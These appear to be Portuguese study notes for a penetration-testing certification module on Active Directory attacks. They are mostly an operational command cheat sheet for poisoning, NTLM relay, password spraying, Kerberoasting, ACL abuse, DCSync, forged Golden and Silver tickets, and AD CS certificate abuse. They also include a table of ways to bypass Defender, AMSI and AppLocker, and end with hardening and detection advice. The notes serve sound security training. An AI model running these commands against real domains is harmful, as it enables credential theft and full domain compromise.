---
tema: Active Directory
tópico: Enumeração, abuso de caminhos de ataque e movimentação em domínio Windows
tags: [htb, cpts, active-directory, kerberos, bloodhound, responder, kerberoasting, dcshadow, acl, trusts]
dificuldade: medium
---

# CPTS 13 — Active Directory Enumeration and Attacks

> [!info] Objetivo
> Sair de "nada" (rede interna sem credencial) até Domain Admin (ou equivalente) em ambiente AD. O ciclo é sempre o mesmo: **enumeração → obtenção de credencial → enumeração com credencial → identificação de caminho → abuso → persistência**. Spider as notas mentais entre cada etapa.

## 🎯 Quando usar

- Você tem conectividade com um DC (53/88/135/139/389/445/464/636/3268/5985).
- Obteve a primeira credencial (spraying, Responder, usuário de aplicação, share legível).
- Precisa justificar um caminho de ataque escalonado em relatório: aqui está o "porquê" de cada passo.

## 🧰 Ferramentas

| Ferramenta | Uso |
|---|---|
| `nxc` (netexec) | Enum LDAP/SMB/WinRM/`--kerberoasting`/`--asreproast` |
| `kerbrute` | Enum de usuários e spraying sem autenticar em SMB |
| `enum4linux-ng`, `rpcclient` | Enum rápida de SMB/RPC |
| `Responder`, `mitm6` | Poisoning LLMNR/NBT-NS/mDNS e IPv6 |
| `ntlmrelayx.py` | Relay NTLM (LDAP/LDAPS/SMB) |
| PowerView / ActiveDirectory module | Enum credenciada no host |
| SharpHound / `bloodhound-python` | Coleta para BloodHound (caminhos) |
| `GetUserSPNs.py` / `GetNPUsers` | Kerberoasting / AS-REP Roasting |
| Rubeus | Kerberos do lado Windows (asks, ptt, s4u) |
| `secretsdump.py`, `mimikatz` | Dump de segredos, DCSync |
| `dacledit.py`, `owneredit.py` | Abuso de ACL |
| Certipy | Abuse de AD CS (ESC1-ESC8) |

## 1️⃣ Enumeração inicial (sem credenciais)

```bash
# Hosts vivos, DC e domínio — sempre comece por aqui
nmap -p53,88,135,139,389,445,464,636,3268,3389,5985 -sV -sC <SUBREDE>/24
nxc smb <SUBREDE>/24                                 # hostname/domínio/OS por host

# Identificar o DC e o domínio
nxc smb <IP-DC> -u '' -p '' --pass-pol               # política de senha anônima
nxc smb <IP-DC> -u '' -p '' --users --groups --shares  # se null session permitida
rpcclient -U "" -N <IP-DC> -c "enumdomusers;enumdomgroups;querydominfo"
enum4linux-ng -A <IP-DC>

# DNS: zona AD reversível e registros internos
dig AXFR <DOMINIO> @<IP-DC>
nxc smb <IP-DC> -u <USUARIO> -p <SENHA> -M enum_dns

# Enum de usuários via Kerberos (não toca em logs de logon falho de SMB)
kerbrute userenum -d <DOMINIO> --dc <IP-DC> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

**Quando usar:** primeiro passo obrigatório. Obter a política de senha (lockout threshold, duração, complexidade) define se você pode fazer spraying e com que cadência.

## 2️⃣ LLMNR / NBT-NS / mDNS + Responder

```bash
# Poisoning clássico: captura NetNTLMv2 de qualquer host que erre a resolução de nome
sudo responder -I <IFACE> -wv        # -w WPAD, -v verbose

# Quebra do hash capturado (formato NetNTLMv2)
hashcat -m 5600 netntlmv2.txt ~/wordlists/rockyou.txt
john --format=netntlmv2 netntlmv2.txt --wordlist=~/wordlists/rockyou.txt

# Desabilitar o responder HTTP/SMB para deixar só relay quando for relaying
sudo responder -I <IFACE> --lm --disable-ess
```

**Quando usar:** só faz sentido se LLMNR/NBT-NS estiverem habilitados (padrão em muitos ambientes). Hashes NetNTLMv2 são **relayáveis** com mais frequência que quebráveis.

### Relay com ntlmrelayx

```bash
# Relay SMB→SMB desabilitado por padrão; SMB→LDAP é o caminho comum
ntlmrelayx.py -tf targets.txt -smb2support
ntlmrelayx.py -t ldap://<IP-DC> --delegate-access          # RBCD via relay
ntlmrelayx.py -t ldap://<IP-DC> --add-computer <NOME>$:<SENHA>
ntlmrelayx.py -t ldaps://<IP-DC> --escalate-user <USUARIO>

# IPv6 spoofing para forçar autenticação em ambientes sem LLMNR
sudo mitm6 -d <DOMINIO>
ntlmrelayx.py -6 -t ldaps://<IP-DC> -wh fakewpad.<DOMINIO> -l loot
```

> [!warning] SMB signing
> Relay para SMB falha se o alvo exigir signing. Enumere com `nxc smb --gen-relay-list relay_targets.txt`.

## 3️⃣ Password Spraying

```bash
# Com política conhecida (ex.: lockout 5 tentativas / 30 min) → uma senha por rodada
nxc smb <IP-DC> -u users.txt -p 'Winter2024!' --continue-on-success

# Kerberos-based (evita log 4625 com lockout em SMB, mais discreto)
kerbrute passwordspray -d <DOMINIO> --dc <IP-DC> users.txt 'Winter2024!'

# Senhas que respeitam a política (12+, maiúscula, minúscula, número, símbolo)
# <Empresa><Ano>! , <Estação><Ano>, <Mês><Ano>  -> testar uma por rodada, sempre com delay
nxc smb <IP-DC> -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
```

**Regras:** descubra o lockout antes, respeite a janela de reset, e nunca use `-P` (lista) direto contra todos os usuários. `nxc` marca `[+] usuario:senha` para validar.

## 4️⃣ Security Controls (o que te derruba)

| Controle | Impacto | Contorno típico |
|---|---|---|
| Windows Defender | Bloqueia SharpHound/msfvenom no disco | Ofuscação, `Set-MpPreference`, `-EncodedCommand`, execução em memória |
| AMSI | Intercepta scripts maliciosos | Bypass em memória (patch em `amsi.dll`), `IEX` ofuscado |
| AppLocker | Bloqueia `.exe` em `%TEMP%` | LOLBins (`rundll32`, `mshta`, `installutil`, `regsvr32`) |
| Constrained Language Mode | Bloqueia Reflection/Add-Type | `powershell -version 2`, `-exec bypass`, cair para C# via `rundll32` |
| LAPS | Senha de admin local aleatória por host | Ler `ms-Mcs-AdmPwd` se você tiver permissão de leitura |
| Credential Guard | Protege LSA no DC/relevantes | Atacar Kerberos (tickets) em vez de memória |
| Tiering / PAWs | Segmentação administrativa | Achar caminho fora do Tier 0 via ACL, GPO ou AD CS |

```powershell
# Verificar seu contexto defensivo antes de agir
Get-MpComputerStatus | Select AMSIProviderVersion, RealTimeProtectionEnabled
$ExecutionContext.SessionState.LanguageMode
Get-AppLockerPolicy -Effective -Xml | Select-String "FilePathRule"
```

## 5️⃣ Enumeração credenciada — PowerView

```powershell
# Dot-source: define centenas de funções (Find-, Get-, Add-, Set-)
. .\PowerView.ps1   # ou Import-Module .\PowerView.ps1

# Domínio, política e trusts
Get-Domain; Get-DomainPolicy; Get-DomainTrust; Get-DomainTrustMapping

# Usuários e grupos
Get-DomainUser -Properties samaccountname,description,memberof,useraccountcontrol
Get-DomainUser -SPN | select samaccountname,serviceprincipalname    # candidatos a Kerberoast
Get-DomainGroup -Identity "Domain Admins" | select -ExpandProperty member
Get-DomainGroupMember -Identity "Remote Management Users" | select MemberName

# Computadores, sessões e privilégio local
Get-DomainComputer -Properties dnshostname,operatingsystem
Find-LocalAdminAccess                       # onde sou admin local?
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"
Get-NetSession -ComputerName <HOST>         # sessões abertas (alvo de roubo de ticket)

# Shares e ACLs interessantes
Find-DomainShare -CheckShareAccess
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -match "<USUARIO>"}
```

### Módulo ActiveDirectory (nativo, sem ferramentas externas)

```powershell
Import-Module ActiveDirectory
Get-ADDomain; Get-ADForest
Get-ADUser -Filter * -Properties * | select samaccountname,description
Get-ADGroup -Filter 'Name -like "*admin*"' | select Name
Get-ADUser -Filter 'Description -like "*pass*"' -Properties Description
Get-ADObject -Filter * -SearchBase "OU=<OU>,DC=<DOMINIO>,DC=<TLD>" -Properties *
```

## 6️⃣ BloodHound / SharpHound

```powershell
# Coleta no Windows (todas as rotas: ACL, sessões, GPO, trusts, AD CS)
.\SharpHound.exe -c All --zipfilename loot.zip
Invoke-BloodHound -CollectionMethod All -Domain <DOMINIO> -ZipFileName loot.zip
```

```bash
# Coleta do Linux com credenciais
bloodhound-python -u <USUARIO> -p '<SENHA>' -d <DOMINIO> -ns <IP-DC> -c All
bloodhound-python -u <USUARIO> -p '<SENHA>' -d <DOMINIO> -dc <HOSTNAME-DC>.<DOMINIO> -c All --zip

# CyperHero / queries úteis no BloodHound:
#   - Shortest Paths from Owned Principals to Domain Admins
#   - Kerberoastable Users, AS-REP Roastable Users
#   - Users with DCSync Rights, Computers with Unconstrained Delegation
```

> [!info] Leitura do grafo
> Cada aresta é um direito Abusable. "Mark as Owned" no seu usuário e pedir "Shortest path to Domain Admins" responde 90% dos engajamentos.

## 7️⃣ LotL — Living off the Land no AD

```powershell
# Sem PowerView: PowerShell nativo + .NET DirectoryServices
([ADSISearcher]"(objectClass=user)").FindAll() | ForEach { $_.Properties.samaccountname }
([ADSISearcher]"(&(objectClass=user)(serviceprincipalname=*))").FindAll()

# Descobrir DCs e domínios sem ferramentas
nltest /dclist:<DOMINIO>
nltest /domain_trusts /all_trusts
nltest /sc_query:<DOMINIO>
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
```

```bash
# Do Linux, tudo acima via LDAP direto
ldapsearch -x -H ldap://<IP-DC> -D "<USUARIO>@<DOMINIO>" -w '<SENHA>' \
  -b "DC=<DOMINIO>,DC=<TLD>" "(servicePrincipalName=*)" sAMAccountName servicePrincipalName

windapsearch -d <DOMINIO> -u <USUARIO> -p '<SENHA>' --da   # listar admins
nxc ldap <IP-DC> -u <USUARIO> -p '<SENHA>' --users --groups --kerberoasting kerb.txt --asreproast asrep.txt
```

## 8️⃣ Kerberoasting

```bash
# Impacket (Linux) — pede os TGS dos SPNs e salva no formato hashcat
GetUserSPNs.py -dc-ip <IP-DC> <DOMINIO>/<USUARIO>:<SENHA> -request -outputfile kerb.hash

# Sem autenticação (quando o DC não exige preauth): raro
GetUserSPNs.py <DOMINIO>/ -dc-ip <IP-DC> -request

# Quebra: RC4 (13100) ou AES (19700/19800). $krb5tgs$23$ = RC4
hashcat -m 13100 kerb.hash ~/wordlists/rockyou.txt -r /usr/share/john/rules/best64.rule
```

```powershell
# Rubeus (Windows) — mais opções de formato e de criptografia
.\Rubeus.exe kerberoast /outfile:kerb.txt /rc4opsec
.\Rubeus.exe kerberoast /user:<USUARIO> /simple      # um alvo específico (evita ruído)
```

**Quando usar:** a conta de serviço costuma ser `svc_*` com senha fraca, sem expiração e com privilégio em algum host. É o caminho de escalada mais comum de um usuário comum.

## 9️⃣ AS-REP Roasting

```bash
# Usuários com "Do not require Kerberos preauthentication" (DONT_REQ_PREAUTH)
GetNPUsers.py <DOMINIO>/ -usersfile users.txt -dc-ip <IP-DC> -request -no-pass -format hashcat

# Com credenciais: testa todos os usuários do domínio de uma vez
GetNPUsers.py <DOMINIO>/<USUARIO>:<SENHA> -dc-ip <IP-DC> -request -outputfile asrep.hash

# nxc faz as duas coisas (Kerberoast + AS-REP) direto
nxc ldap <IP-DC> -u <USUARIO> -p '<SENHA>' --asreproast asrep.txt

# $krb5asrep$23$ → modo 18200
hashcat -m 18200 asrep.hash ~/wordlists/rockyou.txt
```

## 🔟 Enumeração e abuso de ACL

```powershell
# Quem tem direito sobre quem (resolvendo GUIDs para nomes)
Find-InterestingDomainAcl -ResolveGUIDs | ? {$_.IdentityReferenceName -match "<USUARIO>"}
Get-DomainObjectAcl -Identity "<ALVO>" -ResolveGUIDs | ? {$_.ActiveDirectoryRights -ne "ReadProperty"}
```

| Direito | Efeito prático | Abuso (PowerView) |
|---|---|---|
| `GenericAll` / `GenericWrite` | Controle total do objeto | `Set-DomainUserPassword`, `Set-DomainObject`, `Add-DomainGroupMember` |
| `ForceChangePassword` | Trocar senha sem saber a antiga | `Set-DomainUserPassword -Identity <ALVO> -AccountPassword (ConvertTo-SecureString '<NOVA>' -AsPlainText -Force)` |
| `AddMember` (grupo) | Entrar em grupo privilegiado | `Add-DomainGroupMember -Identity "Domain Admins" -Members <USUARIO>` |
| `WriteOwner` | Assumir propriedade do objeto | `Set-DomainObjectOwner -Identity <ALVO> -OwnerIdentity <USUARIO>` |
| `WriteDACL` | Conceder direitos a si mesmo | `Add-DomainObjectAcl -TargetIdentity <ALVO> -PrincipalIdentity <USUARIO> -Rights All` |
| `AllExtendedRights` | Inclui reset de senha e DCSync (em DC) | `Set-DomainUserPassword` / `secretsdump` |
| `GetChanges`/`GetChangesAll` | DCSync | `secretsdump.py -just-dc` |

```bash
# Mesmas operações do Linux, sem tocar em PowerShell no alvo
dacledit.py -action write -rights FullControl -principal <USUARIO> -target <ALVO> <DOMINIO>/<USUARIO>:<SENHA>
owneredit.py -action write -new-owner <USUARIO> -target <ALVO> <DOMINIO>/<USUARIO>:<SENHA>
addcomputer.py -computer-name '<MAQUINA>$' -computer-pass '<SENHA>' \
  -dc-ip <IP-DC> <DOMINIO>/<USUARIO>:<SENHA>          # base para RBCD
rbcd.py -delegate-from '<MAQUINA$>' -delegate-to '<ALVO>$' -action write <DOMINIO>/<USUARIO>:<SENHA>
```

**Quando usar:** quando BloodHound mostra aresta `WriteDACL`/`GenericAll` do seu usuário em grupo ou computador — é escalada de um salto só.

## 1️⃣1️⃣ DCSync

```bash
# Requer: Domain Admin, ou GetChanges + GetChangesAll, ou replicação delegada
secretsdump.py <DOMINIO>/<USUARIO>:<SENHA>@<IP-DC> -just-dc-ntlm
secretsdump.py <DOMINIO>/<USUARIO>@<IP-DC> -hashes :<HASH> -just-dc-user krbtgt

# Classificação rápida do loot
#   krbtgt    -> Golden Ticket
#   <USUARIO> -> Pass-the-Hash / overpass-the-hash
#   Machine$  -> Silver Ticket / RBCD
```

```powershell
# Mimikatz, se você tem execução no DC
lsadump::dcsync /domain:<DOMINIO> /user:<USUARIO>
lsadump::dcsync /domain:<DOMINIO> /all /csv
```

## 1️⃣2️⃣ Privileged Access e persistência

```powershell
# LAPS: ler a senha do admin local do host
Get-LapsADPassword -Identity <HOST> -AsPlainText     # módulo LAPS novo
Get-DomainComputer <HOST> -Properties ms-Mcs-AdmPwd  # PowerView (LAPS legado)

# Abuso de GPO: aplicar tarefa/script como SYSTEM onde você tiver write na GPO
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Upd" --Author <DOMINIO>\<USUARIO> \
  --Command "cmd.exe" --Arguments "/c powershell -enc <BASE64>" --GPOName "<GPO>"

# Delegation
Get-DomainComputer -Unconstrained | select dnshostname     # Unconstrained (TGT no LSASS)
Get-DomainUser -TrustedToAuth                              # Constrained delegation
Get-DomainUser -Properties msds-allowedtodelegateto

# AD CS: ESC1 típico -> certificado como admin
certipy find -u <USUARIO>@<DOMINIO> -p '<SENHA>' -dc-ip <IP-DC> -vulnerable
certipy req -u <USUARIO>@<DOMINIO> -p '<SENHA>' -ca <CA> -template <TEMPLATE> -upn administrator@<DOMINIO>
certipy auth -pfx administrator.pfx -dc-ip <IP-DC>
```

```bash
# Golden Ticket: assinado com o hash do krbtgt — acesso que sobrevive a resets de senha
ticketer.py -nthash <KRBTGT-HASH> -domain-sid <SID-DOMINIO> -domain <DOMINIO> administrator
export KRB5CCNAME=$PWD/administrator.ccache
wmiexec.py -k -no-pass <HOST>.<DOMINIO>

# Silver Ticket: assinado com o hash da conta de máquina/serviço, sem tocar no DC
ticketer.py -nthash <HASH-MAQUINA$> -domain-sid <SID> -domain <DOMINIO> -spn cifs/<HOST>.<DOMINIO> administrator

# Overpass-the-hash (usar hash NTLM para obter TGT Kerberos)
getTGT.py <DOMINIO>/<USUARIO> -hashes :<HASH> -dc-ip <IP-DC>
export KRB5CCNAME=$PWD/<USUARIO>.ccache
```

> [!warning] Segurança defensiva
> DCSync, Golden Ticket e alterações de ACL em `Domain Admins` podem derrubar o domínio. Em produção: faça backup do `ntds.dit`/estado do DC e peça autorização explícita por escrito antes.

## 1️⃣3️⃣ Trusts, Double Hop e ExtraSids

```powershell
# Mapear confiança entre domínios/florestas
Get-DomainTrust; Get-ForestTrust; Get-DomainTrustMapping
nltest /domain_trusts /all_trusts /v
```

| Tipo de trust | Direção | Uso ofensivo |
|---|---|---|
| Parent/Child | Bidirecional, mesma floresta | ExtraSids (SID History) via Golden Ticket |
| External | Bidirecional fora da floresta | SID Filtering protege; atacar contas locais |
| Forest | Bidirecional entre florestas | SID Filtering ativo por padrão |
| One-way / Inbound | Domínio confia em você | Enumerar o outro lado com credencial confiável |

```bash
# Cross-domain com credenciais do domínio confiável
nxc smb <IP-DC-OUTRO> -u <USUARIO-ORIGEM> -p '<SENHA>' -d <DOMINIO-ORIGEM>

# ExtraSids: Golden Ticket com SID History contendo o SID de Domain Admins da floresta pai
ticketer.py -nthash <KRBTGT-HASH> -domain-sid <SID-FILHO> -domain <DOMINIO-FILHO> \
  -extra-sid <SID-ENTERPRISE-ADMINS> administrator
```

### Double Hop (o clássico "kerberos não funciona no segundo salto")

```powershell
# Problema: sessão PS remota não carrega seus tickets -> segundo salto perde autenticação
# Contornos:
# 1) Double-hop por credencial explícita (evita delegação)
Invoke-Command -ComputerName <HOST-INTERNO> -Credential (Get-Credential) -ScriptBlock { whoami }

# 2) Usar -CredSSP quando permitido no cliente
Enter-PSSession -ComputerName <HOST-INTERNO> -Credential <CRED> -Authentication CredSSP

# 3) Delegation: unconstrained (TGT fica no LSASS do host), constrained, ou RBCD
# 4) Pass-the-ticket no host intermediário (Rubeus/mimikatz) e então o segundo salto
```

## 1️⃣4️⃣ Hardening e detecções (para o relatório)

- **Disable LLMNR/NBT-NS** via GPO e desabilitar mDNS; habilitar SMB signing e LDAP signing/channel binding.
- **Protected Users** para contas privilegiadas + **tiering** administrativo (Tier 0 isolado).
- **LAPS** em todas as estações/servidores; sem ele, o admin local é o reino do movimento lateral.
- **gMSA** para contas de serviço (senha de 120 caracteres, rotacionada pela AD) mata Kerberoasting.
- **Não delegar** `GetChanges`/`GetChangesAll` fora de DCs; auditar ACLs periodicamente.
- **Eventos-chave:** 4624/4625 (logon), 4768/4769/4771 (Kerberos, TGS anômalo = 4769 com `0x17`), 4662 (acesso a objeto), 5136 (modificação de objeto), 4104 (script block logging).

## ⚠️ Pegadinhas

- **Lockout** é o erro nº 1. Descubra o threshold antes; uma senha por rodada; monitore `--continue-on-success`.
- **`nxc` com `-p ''`** é null logon, não guest — resultados diferentes.
- Kerberoasting com **AES** quebra muito mais devagar: priorize contas com `msDS-SupportedEncryptionTypes` RC4.
- **`GetUserSPNs` sem `-request`** não gera hash; ele só lista.
- Hash NetNTLMv2 **não** serve para pass-the-hash — precisa quebrar.
- `secretsdump` sem admin **falha silenciosamente** em modo remoto; teste `nxc smb` antes.
- **Golden Ticket com SID errado** não funciona; pegue `<SID-DOMINIO>` com `whoami /user`.
- **Timeout do TGT** (10h): renove com `getTGT.py` ou use `kinit`.
- **Sessões PS remotas** não herdam tickets (double hop) — veja seção 13.
- `mimikatz` só com admin **e** `SeDebugPrivilege`; `lsass` protegido por PPL exige driver.

## ✅ Checklist rápido

- [ ] Descobrir DC, domínio, política de senha e lockout
- [ ] Enum de usuários via Kerberos (`kerbrute`) + RPC/LDAP
- [ ] Responder/mitm6 rodando enquanto procura tráfego (checar signing antes do relay)
- [ ] Spraying conservador com senhas compatíveis com a política
- [ ] Contexto: Defender/AMSI/AppLocker/LAPS/CLM
- [ ] Enum credenciada: PowerView + ActiveDirectory + SharpHound/BloodHound
- [ ] Kerberoast e AS-REP Roast com quebra offline
- [ ] ACLs: identificar e abusar (GenericAll/WriteDACL/ForceChangePassword)
- [ ] DCSync quando houver GetChanges+GetChangesAll ou DA
- [ ] Delegation (unconstrained/constrained/RBCD) e AD CS
- [ ] Trusts e ExtraSids se houver floresta pai
- [ ] Coletar evidência: comandos, timestamps, hash de arquivos e caminho de ataque

## 🔗 Relacionado

- [[CPTS 10 - Password Attacks]]
- [[CPTS 11 - Attacking Common Services]]
- [[CPTS 12 - Pivoting, Tunneling, and Port Forwarding]]
- [[CPTS 28 - Attacking Enterprise Networks]]
- [[Fase 09 - Active Directory]]
